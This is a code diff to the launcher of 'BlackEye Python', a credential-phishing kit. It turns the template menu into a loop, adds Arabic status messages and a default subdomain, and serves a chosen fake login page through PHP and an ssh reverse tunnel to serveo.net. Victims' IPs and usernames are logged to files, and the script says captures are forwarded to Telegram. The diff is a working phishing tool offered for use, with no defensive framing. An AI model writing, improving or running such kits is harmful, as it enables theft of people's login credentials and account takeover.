@@ -161,32 +161,61 @@ try:
     '32': 'devianart',
     '33': 'create'
     }
-    number = input(colors.YELLOW + "[" + colors.RESET + "?" + colors.YELLOW + "]" + colors.RESET + "> ")
-    
-    if number.upper() == "TG":
-        setup_telegram()
-        exit()
-    elif number.upper() == "T":
-        config.toggle_dark_mode()
-        colors.update_colors()
-        print_banner()
-        exit()
-    elif number.upper() == "Q":
-        exit()
-    elif number == "18":
-        print("Ebay Currently Does Not Work. Choose Another..")
-        exit()
-    else:
-        pass
-    choice = templates[number]
-    print("Loading %s" % (choice))
-    print("\nEnter A Custom Subdomain")
-    subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
-    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
-    cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
-    p = subprocess.Popen(cmd_line, shell=True)
-    out = p.communicate()[0]
+    while True:
+        try:
+            number = input(colors.YELLOW + "[" + colors.RESET + "?" + colors.YELLOW + "]" + colors.RESET + "> ")
+            
+            if number.upper() == "TG":
+                setup_telegram()
+                continue
+            elif number.upper() == "T":
+                config.toggle_dark_mode()
+                colors.update_colors()
+                print_banner()
+                continue
+            elif number.upper() == "Q":
+                print_colored("\nشكراً لاستخدام BlackEye Python!", colors.SUCCESS)
+                exit()
+            elif number == "18":
+                print_colored("eBay لا يعمل حالياً. اختر قالب آخر..", colors.ERROR)
+                continue
+            elif number not in templates:
+                print_colored("خيار غير صحيح! اختر رقم من 1-33 أو الأوامر الخاصة", colors.ERROR)
+                continue
+            
+            choice = templates[number]
+            print_colored(f"جاري تحميل قالب {choice}...", colors.INFO)
+            
+            print_colored("\nأدخل اسم النطاق الفرعي المخصص:", colors.PRIMARY)
+            subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
+            
+            if not subdom.strip():
+                subdom = f"blackeye-{choice}"
+                print_colored(f"تم استخدام النطاق الافتراضي: {subdom}", colors.INFO)
+            
+            print_colored(f"\n🚀 بدء الخادم على {subdom}.serveo.net...", colors.SUCCESS)
+            print_colored(f"📝 السجلات في: sites/{choice}/ip.txt و sites/{choice}/usernames.txt", colors.INFO)
+            print_colored("📱 تم إعداد Telegram بنجاح - ستصلك الرسائل تلقائياً!", colors.SUCCESS)
+            print_colored("\n⚠️  لإيقاف الخادم اضغط Ctrl+C", colors.WARNING)
+            
+            # بدء الخادم
+            cmd_line = f"php -t sites/{choice} -S 0.0.0.0:5000 & ssh -R {subdom}.serveo.net:80:localhost:5000 serveo.net"
+            print_colored(f"\n🔧 تشغيل الأمر: {cmd_line}", colors.INFO)
+            
+            try:
+                p = subprocess.Popen(cmd_line, shell=True)
+                p.wait()
+            except KeyboardInterrupt:
+                print_colored("\n\n⏹️  تم إيقاف الخادم", colors.WARNING)
+                print_colored("العودة للقائمة الرئيسية...\n", colors.INFO)
+                continue
+                
+        except KeyboardInterrupt:
+            print_colored("\n\nشكراً لاستخدام BlackEye Python!", colors.SUCCESS)
+            break
+        except Exception as e:
+            print_colored(f"خطأ: {e}", colors.ERROR)
+            continue
 
 
 except KeyboardInterrupt:
